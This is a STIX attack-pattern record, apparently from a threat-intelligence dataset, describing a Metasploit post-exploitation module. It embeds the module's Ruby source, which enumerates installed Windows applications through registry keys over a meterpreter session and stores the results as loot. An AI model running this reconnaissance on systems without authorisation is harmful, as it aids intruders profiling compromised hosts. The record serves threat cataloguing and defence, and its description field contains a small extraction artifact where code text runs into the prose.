{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8503b402-544b-4d97-b257-0c9bcb44a26c",
    "created": "2024-08-14T16:33:05.062036Z",
    "modified": "2024-08-14T16:33:05.06204Z",
    "name": "Windows Gather Installed Application Enumeration",
    "description": "This module will enumerate all installed applications on a Windows system 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_applications.rb",
            "external_id": "enum_applications.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Installed Application Enumeration',\n        'Description' => %q{ This module will enumerate all installed applications on a Windows system },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n  end\n\n  def app_list\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Installed Applications',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'Name',\n        'Version'\n      ]\n    )\n    appkeys = [\n      'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall',\n      'HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall',\n      'HKLM\\\\SOFTWARE\\\\WOW6432NODE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall',\n      'HKCU\\\\SOFTWARE\\\\WOW6432NODE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall',\n    ]\n    apps = []\n    appkeys.each do |keyx86|\n      found_keys = registry_enumkeys(keyx86)\n      next unless found_keys\n\n      found_keys.each do |ak|\n        apps << keyx86 + '\\\\' + ak\n      end\n    end\n\n    t = []\n    until apps.empty?\n\n      1.upto(16) do\n        t << framework.threads.spawn(\"Module(#{refname})\", false, apps.shift) do |k|\n          dispnm = registry_getvaldata(k.to_s, 'DisplayName')\n          dispversion = registry_getvaldata(k.to_s, 'DisplayVersion')\n          tbl << [dispnm, dispversion] if dispnm && dispversion\n        rescue StandardError\n        end\n      end\n      t.map(&:join)\n    end\n\n    results = tbl.to_s\n\n    print_line(\"\\n\" + results + \"\\n\")\n\n    p = store_loot('host.applications', 'text/plain', session, results, 'applications.txt', 'Installed Applications')\n    print_good(\"Results stored in: #{p}\")\n  end\n\n  def run\n    print_status(\"Enumerating applications installed on #{sysinfo['Computer']}\")\n    app_list\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}